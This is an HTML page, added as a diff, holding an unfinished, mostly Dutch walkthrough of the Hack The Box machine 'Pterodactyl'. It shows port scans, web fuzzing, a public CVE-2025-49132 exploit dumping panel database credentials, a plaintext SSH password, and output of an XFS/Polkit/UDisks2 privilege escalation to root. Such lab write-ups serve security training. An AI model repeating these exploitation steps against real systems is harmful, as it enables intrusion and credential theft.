@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Pterodactyl] └─$ nmap 10.129.76.138 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 09:55 CET Nmap scan report for pterodactyl.htb (10.129.76.138) Host is up (0.042s latency). Not shown: 981 filtered tcp ports (no-response), 15 filtered tcp ports (admin-prohibited) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp closed https 8080/tcp closed http-proxy Detailed port scan At the detailed port scan go to get more information from the host.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-pterodactyl/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Pterodactyl] └─$ nmap 10.129.76.138 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 09:55 CET Nmap scan report for pterodactyl.htb (10.129.76.138) Host is up (0.042s latency). Not shown: 981 filtered tcp ports (no-response), 15 filtered tcp ports (admin-prohibited) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp closed https 8080/tcp closed http-proxy Detailed port scan At the detailed port scan go to get more information from the host.">
+  <meta itemprop="wordCount" content="1193">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Pterodactyl] └─$ nmap 10.129.76.138 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 09:55 CET Nmap scan report for pterodactyl.htb (10.129.76.138) Host is up (0.042s latency). Not shown: 981 filtered tcp ports (no-response), 15 filtered tcp ports (admin-prohibited) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp closed https 8080/tcp closed http-proxy Detailed port scan At the detailed port scan go to get more information from the host.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-pterodactyl/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Pterodactyl]
+└─$ nmap 10.129.76.138                      
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 09:55 CET
+Nmap scan report for pterodactyl.htb (10.129.76.138)
+Host is up (0.042s latency).
+Not shown: 981 filtered tcp ports (no-response), 15 filtered tcp ports (admin-prohibited)
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+443/tcp  closed https
+8080/tcp closed http-proxy
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the host.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Pterodactyl]
+└─$ nmap -p22,80,443,8080 -sCV 10.129.76.138      
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 09:54 CET
+Nmap scan report for pterodactyl.htb (10.129.76.138)
+Host is up (0.29s latency).
+
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
+| ssh-hostkey: 
+|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
+|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
+80/tcp   open   http       nginx 1.21.5
+|_http-title: My Minecraft Server
+|_http-server-header: nginx/1.21.5
+443/tcp  closed https
+8080/tcp closed http-proxy
+</code></pre><p>Ik ben als eerst gaan kijken naar de verschillende pagina&rsquo;s. Maar Er is alleen op poort 80 iets gevonden. Ik ben door gebruik van het ffuf tool aan Directory enumeration gaan doen en hier heb ik de Public dir gevonden.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Pterodactyl]
+└─$ ffuf -u http://pterodactyl.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  -ac     
+
+Public                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 17ms]
+:: Progress: [29999/29999] :: Job [1/1] :: 283 req/sec :: Duration: [0:00:29] :: Errors: 1 ::
+</code></pre><p>Hierbij is er niets te vinden want het is forbidden. Ik heb ook gezien dat er op pagina een changelog bestand gevonden was. Ik heb gezien in de file dat er Pterodactyl Panel v1.11.10 draait met de volgende informatie:</p>
+<ul>
+<li>Installed Pterodactyl Panel.</li>
+<li>Configured environment:
+<ul>
+<li>PHP with required extensions.</li>
+<li>MariaDB 11.8.3 backend.</li>
+</ul>
+</li>
+</ul>
+<p>Ik ben dus nu gaan zoeken naar een vulnerability voor de panel met de versie en hierbij ben ik op het volgende gekomen. <a href="https://github.com/Zen-kun04/CVE-2025-49132">https://github.com/Zen-kun04/CVE-2025-49132</a> maar voor het moment loopt dit spoor ook vast. Ik ben eens gaan kijken of er een andere hosts gekent is en hierbij kan je zien dat een panel gekent is.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Pterodactyl/CVE-2025-49132]
+└─$ ffuf -u http://play.pterodactyl.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H &#34;HOST:FUZZ.pterodactyl.htb&#34; -ac 
+
+panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 1454ms]
+:: Progress: [19966/19966] :: Job [1/1] :: 1709 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
+</code></pre><p>Ik ben deze gaan toevoegen aan de hosts file en daar kan je zien dat er een login page gekent is.</p>
+<p>![[Pasted image 20260209102713.png]]</p>
+<p>maar dit heeft me ook aan een dood spoor geleid. ik zal weer moeten gaan zoeken naar een andere exploit voor de panel versie. Hierop ben ik op de volgende exploit gekomen <a href="https://github.com/63square/CVE-2025-49132">https://github.com/63square/CVE-2025-49132</a>. Aan de hand van het exploit python script heb ik gezien dat de url exploitable is en door gebruik te maken van de dump_credentials script ben ik de volgende database en zijn credentials gaan dumpen.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Pterodactyl/CVE-2025-49132]
+└─$ python3 exploit.py http://panel.pterodactyl.htb/     
+/home/kali/HTB/Pterodactyl/CVE-2025-49132/exploit.py:16: SyntaxWarning: invalid escape sequence &#39;\/&#39;
+  expected = &#39;{&#34;..\/..\/config\/prologue&#34;:{&#34;alerts&#34;:{&#34;levels&#34;:[&#34;info&#34;,&#34;warning&#34;,&#34;danger&#34;,&#34;success&#34;],&#34;session_key&#34;:&#34;alert_messages&#34;}}}&#39;
+Target is vulnerable!
+
+┌──(kali㉿kali)-[~/HTB/Pterodactyl/CVE-2025-49132]
+└─$ python3 dump-creds.py http://panel.pterodactyl.htb/                                                  
+/home/kali/HTB/Pterodactyl/CVE-2025-49132/dump-creds.py:20: SyntaxWarning: invalid escape sequence &#39;\/&#39;
+  expected = &#39;{&#34;..\/..\/config\/prologue&#34;:{&#34;alerts&#34;:{&#34;levels&#34;:[&#34;info&#34;,&#34;warning&#34;,&#34;danger&#34;,&#34;success&#34;],&#34;session_key&#34;:&#34;alert_messages&#34;}}}&#39;
+Target is vulnerable!
+App key: base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=
+
+-- Database config --
+{&#39;default&#39;: &#39;mysql&#39;, &#39;connections&#39;: {&#39;mysql&#39;: {&#39;driver&#39;: &#39;mysql&#39;, &#39;url&#39;: &#39;&#39;, &#39;host&#39;: &#39;127.0.0.1&#39;, &#39;port&#39;: &#39;3306&#39;, &#39;database&#39;: &#39;panel&#39;, &#39;username&#39;: &#39;pterodactyl&#39;, &#39;password&#39;: &#39;PteraPanel&#39;, &#39;unix_socket&#39;: &#39;&#39;, &#39;charset&#39;: &#39;utf8mb4&#39;, &#39;collation&#39;: &#39;utf8mb4_unicode_ci&#39;, &#39;prefix&#39;: &#39;&#39;, &#39;prefix_indexes&#39;: &#39;1&#39;, &#39;strict&#39;: &#39;&#39;, &#39;timezone&#39;: &#39;+00{{00}}&#39;, &#39;sslmode&#39;: &#39;prefer&#39;, &#39;options&#39;: {&#39;1014&#39;: &#39;1&#39;}}}, &#39;migrations&#39;: &#39;migrations&#39;, &#39;redis&#39;: {&#39;client&#39;: &#39;predis&#39;, &#39;options&#39;: {&#39;cluster&#39;: &#39;redis&#39;, &#39;prefix&#39;: &#39;pterodactyl_database_&#39;}, &#39;default&#39;: {&#39;scheme&#39;: &#39;tcp&#39;, &#39;path&#39;: &#39;/run/redis/redis.sock&#39;, &#39;host&#39;: &#39;127.0.0.1&#39;, &#39;username&#39;: &#39;&#39;, &#39;password&#39;: &#39;&#39;, &#39;port&#39;: &#39;6379&#39;, &#39;database&#39;: &#39;0&#39;, &#39;context&#39;: []}, &#39;sessions&#39;: {&#39;scheme&#39;: &#39;tcp&#39;, &#39;path&#39;: &#39;/run/redis/redis.sock&#39;, &#39;host&#39;: &#39;127.0.0.1&#39;, &#39;username&#39;: &#39;&#39;, &#39;password&#39;: &#39;&#39;, &#39;port&#39;: &#39;6379&#39;, &#39;database&#39;: &#39;1&#39;, &#39;context&#39;: []}}}
+
+-- Filesystem config --
+{&#39;default&#39;: &#39;local&#39;, &#39;disks&#39;: {&#39;local&#39;: {&#39;driver&#39;: &#39;local&#39;, &#39;root&#39;: &#39;/var/www/pterodactyl/storage/app&#39;, &#39;throw&#39;: &#39;&#39;}, &#39;public&#39;: {&#39;driver&#39;: &#39;local&#39;, &#39;root&#39;: &#39;/var/www/pterodactyl/storage/app/public&#39;, &#39;url&#39;: &#39;http://panel.pterodactyl.htb/storage&#39;, &#39;visibility&#39;: &#39;public&#39;, &#39;throw&#39;: &#39;&#39;}, &#39;s3&#39;: {&#39;driver&#39;: &#39;s3&#39;, &#39;key&#39;: &#39;&#39;, &#39;secret&#39;: &#39;&#39;, &#39;region&#39;: &#39;&#39;, &#39;bucket&#39;: &#39;&#39;, &#39;url&#39;: &#39;&#39;, &#39;endpoint&#39;: &#39;&#39;, &#39;use_path_style_endpoint&#39;: &#39;&#39;, &#39;throw&#39;: &#39;&#39;}}, &#39;links&#39;: {&#39;/var/www/pterodactyl/public/storage&#39;: &#39;/var/www/pterodactyl/storage/app/public&#39;}}
+
+-- Mail config --
+{&#39;default&#39;: &#39;smtp&#39;, &#39;mailers&#39;: {&#39;smtp&#39;: {&#39;transport&#39;: &#39;smtp&#39;, &#39;host&#39;: &#39;smtp.example.com&#39;, &#39;port&#39;: &#39;25&#39;, &#39;encryption&#39;: &#39;tls&#39;, &#39;username&#39;: &#39;&#39;, &#39;password&#39;: &#39;&#39;, &#39;timeout&#39;: &#39;&#39;, &#39;local_domain&#39;: &#39;panel.pterodactyl.htb&#39;}, &#39;ses&#39;: {&#39;transport&#39;: &#39;ses&#39;}, &#39;mailgun&#39;: {&#39;transport&#39;: &#39;mailgun&#39;}, &#39;postmark&#39;: {&#39;transport&#39;: &#39;postmark&#39;}, &#39;sendmail&#39;: {&#39;transport&#39;: &#39;sendmail&#39;, &#39;path&#39;: &#39;/usr/sbin/sendmail -bs -i&#39;}, &#39;log&#39;: {&#39;transport&#39;: &#39;log&#39;, &#39;channel&#39;: &#39;&#39;}, &#39;array&#39;: {&#39;transport&#39;: &#39;array&#39;}, &#39;failover&#39;: {&#39;transport&#39;: &#39;failover&#39;, &#39;mailers&#39;: [&#39;smtp&#39;, &#39;log&#39;]}}, &#39;from&#39;: {&#39;address&#39;: &#39;no-reply@example.com&#39;, &#39;name&#39;: &#39;Pterodactyl Panel&#39;}, &#39;markdown&#39;: {&#39;theme&#39;: &#39;default&#39;, &#39;paths&#39;: [&#39;/var/www/pterodactyl/resources/views/vendor/mail&#39;]}}
+</code></pre><p>IK MOET DE REVSHELL CONNECTIE MAKEN MET DE SERVER. DAAR ZAL IK EEN FILE VINDEN MET EEN HASH DIE IK MOET DECRYPTEREN</p>
+<table>
+  <thead>
+      <tr>
+          <th>Username</th>
+          <th>Password</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>phileasfogg3</td>
+          <td>!QAZ2wsx</td>
+      </tr>
+  </tbody>
+</table>
+<p>Hiermee heb ik kunnen inloggen op de ssh server.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Pterodactyl]
+└─$ ssh phileasfogg3@pterodactyl.htb             
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &#34;store now, decrypt later&#34; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+(phileasfogg3@pterodactyl.htb) Password: 
+Have a lot of fun...
+Last login: Mon Feb  9 12:09:39 2026 from 10.10.16.154
+Last login: Mon Feb 9 14:46:06 2026 from 10.10.16.154
+phileasfogg3@pterodactyl:~&gt;
+</code></pre><pre tabindex="0"><code>[+] Step 1: Creating malicious XFS image with SUID bash...
+300+0 records in
+300+0 records out
+314572800 bytes (315 MB, 300 MiB) copied, 0.59882 s, 525 MB/s
+[sudo] password for kali: 
+[+] Downloading bash from target...
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &#34;store now, decrypt later&#34; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+(phileasfogg3@pterodactyl.htb) Password: 
+bash                                                                              100%  989KB   3.0MB/s   00:00    
+[+] Malicious XFS image created successfully
+
+[+] Step 2: Uploading malicious XFS image to target...
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &#34;store now, decrypt later&#34; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+(phileasfogg3@pterodactyl.htb) Password: 
+xfs.image                                                                         100%  300MB   2.0MB/s   02:28    
+[+] Image uploaded to /tmp/xfs.image on target
+
+[+] Step 3: Executing Polkit bypass...
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &#34;store now, decrypt later&#34; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Have a lot of fun...
+Last login: Mon Feb 9 15:55:27 2026 from 10.10.16.154
+Polkit bypass variables written to ~/.pam_environment
+You will need to logout and login again for this to take effect
+
+[!] IMPORTANT: You must logout and login again for Polkit bypass to work
+[!] Run: ssh phileasfogg3@pterodactyl.htb
+[!] Then re-run this script or execute the exploit manually
+
+[+] Step 4: Executing UDisks2 race condition exploit...
+./exploit.sh: line 101: warning: here-document at line 68 delimited by end-of-file (wanted `ENDSSH&#39;)
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &#34;store now, decrypt later&#34; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Have a lot of fun...
+Last login: Mon Feb 9 15:55:27 2026 from 10.10.16.154
+[+] Killed gvfs-udisks2-volume-monitor
+[+] Loop device created: /dev/loop0
+[+] Started background watcher (PID: 5316)
+[+] Triggering UDisks2 resize vulnerability...
+[+] Caught SUID bash at /tmp/blockdev.BHBDK3/bash
+</code></pre><pre tabindex="0"><code>phileasfogg3@pterodactyl:/tmp&gt; ls
+blockdev.BHBDK3                                                                 vmware-root_811-4290756501
+root_out.txt                                                                    vmware-root_812-2957648972
+systemd-private-6b598338b15847029114213150aa8c1e-chronyd.service-g96QTM         vmware-root_814-2966103502
+systemd-private-6b598338b15847029114213150aa8c1e-nginx.service-2cvH93           vmware-root_818-2957124693
+systemd-private-6b598338b15847029114213150aa8c1e-php-fpm.service-4XSOpn         vmware-root_819-4290101131
+systemd-private-6b598338b15847029114213150aa8c1e-redis@redis.service-hbeamE     vmware-root_820-2956993618
+systemd-private-6b598338b15847029114213150aa8c1e-systemd-logind.service-VkuRIS  vmware-root_821-4290232204
+vmware-root_805-4257200540                                                      vmware-root_822-2965448144
+vmware-root_807-4248746014                                                      vmware-root_834-2722239005
+vmware-root_809-4282301975                                                      xfs.image
+phileasfogg3@pterodactyl:/tmp&gt; cat root_out.txt
+uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
+b3ffb402faa0edb3c6f7f2b62c20e03d
+phileasfogg3@pterodactyl:/tmp&gt; 
+</code></pre><p>![[Pasted image 20260209154127.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
